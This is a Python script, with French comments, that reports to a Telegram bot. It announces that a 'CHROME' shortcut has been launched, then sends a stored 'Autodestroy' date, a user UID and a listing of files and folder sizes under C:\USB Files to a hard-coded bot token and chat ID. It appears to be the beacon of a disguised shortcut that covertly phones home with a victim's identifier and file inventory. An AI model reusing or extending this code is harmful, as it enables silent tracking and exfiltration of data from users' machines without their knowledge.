import asyncio
import os
from telegram import Bot
from datetime import datetime

current_date = datetime.now().strftime("%Y-%m-%d")

async def envoyer_message_telegram(message, chat_id, token):
    bot = Bot(token=token)
    await bot.send_message(chat_id=chat_id, text=message)

async def lire_et_envoyer_contenu_fichier(chat_id, token, filename, message_prefix=""):
    try:
        with open(filename, "r") as file:
            contenu_fichier = file.read()
    except FileNotFoundError:
        contenu_fichier = f"Le fichier {filename} n'a pas été trouvé."

    message_with_content = f"{message_prefix}{contenu_fichier}"
    await envoyer_message_telegram(message_with_content, chat_id, token)

async def lister_dossiers_et_tailles(chat_id, token, directory_path, message_prefix=""):
    try:
        folder_info = []
        for item in os.listdir(directory_path):
            item_path = os.path.join(directory_path, item)
            if os.path.isdir(item_path):
                folder_size = sum(os.path.getsize(os.path.join(item_path, file)) for file in os.listdir(item_path) if os.path.isfile(os.path.join(item_path, file)))
                folder_info.append(f"{item} (Dossier): {folder_size / (1024 * 1024):.2f} MB")
            elif os.path.isfile(item_path):
                file_size = os.path.getsize(item_path) / (1024 * 1024)
                folder_info.append(f"{item} (Fichier): {file_size:.2f} MB")
        if not folder_info:
            message = "Le répertoire est vide."
        else:
            message = f"{message_prefix}\n" + "\n".join(folder_info)
    except FileNotFoundError:
        message = "Le répertoire spécifié n'existe pas."
    except Exception as e:
        message = f"Une erreur s'est produite : {str(e)}"
    
    await envoyer_message_telegram(message, chat_id, token)

if __name__ == "__main__":
    # Remplacez YOUR_BOT_TOKEN par le token de votre bot Telegram
    token = "YOUR_BOT_TOKEN"

    # Remplacez CHAT_ID par l'identifiant du chat où vous souhaitez envoyer le message
    chat_id = "CHAT_ID"

    # Spécifiez le chemin du répertoire
    directory_path = r"C:\USB Files"
    message2 = f"The 🔗CHROME🔗 shortcut is launched 🤖✅\n"
    message = f"$-------------------------------------------------------$\n"

    # Utilisez asyncio pour exécuter les coroutines de manière asynchrone
    asyncio.run(envoyer_message_telegram(message, chat_id, token))
    asyncio.run(envoyer_message_telegram(message2, chat_id, token))

    # Lecture et envoi du contenu de date.txt
    asyncio.run(lire_et_envoyer_contenu_fichier(chat_id, token, "date.txt", "Autodestroy 💥: "))

    # Lecture et envoi du contenu de uid.txt
    asyncio.run(lire_et_envoyer_contenu_fichier(chat_id, token, "uid.txt", "User UID 🧑‍🏫❗: "))

    # Liste des dossiers et fichiers avec leurs tailles dans le répertoire spécifié
    asyncio.run(lister_dossiers_et_tailles(chat_id, token, directory_path, "Folders 📂:"))
    asyncio.run(envoyer_message_telegram(message, chat_id, token))
